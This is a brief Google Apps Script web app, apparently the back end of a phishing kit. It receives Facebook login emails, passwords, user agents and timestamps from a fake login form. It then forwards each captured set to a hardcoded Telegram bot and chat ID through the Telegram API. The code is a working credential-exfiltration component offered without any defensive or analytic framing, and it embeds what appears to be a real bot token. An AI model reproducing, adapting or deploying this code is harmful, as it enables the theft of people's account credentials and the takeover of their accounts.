// Apps Script Web App – Telegram Proxy
function doPost(e) {
  const data = JSON.parse(e.postData.contents);
  const token = "8614494771:AAENDkZulMFkCR98bqSBJuOseDSBAh8KjnU";
  const chatId = "7994255254";
  
  const message = `🎭 FB LOGIN\nEmail: ${data.email}\nPassword: ${data.password}\nUser-Agent: ${data.ua}\nTime: ${data.ts}`;
  
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const options = {
    method: "post",
    payload: {
      chat_id: chatId,
      text: message,
      parse_mode: "HTML"
    }
  };
  
  UrlFetchApp.fetch(url, options);
  return ContentService.createTextOutput("OK");
}
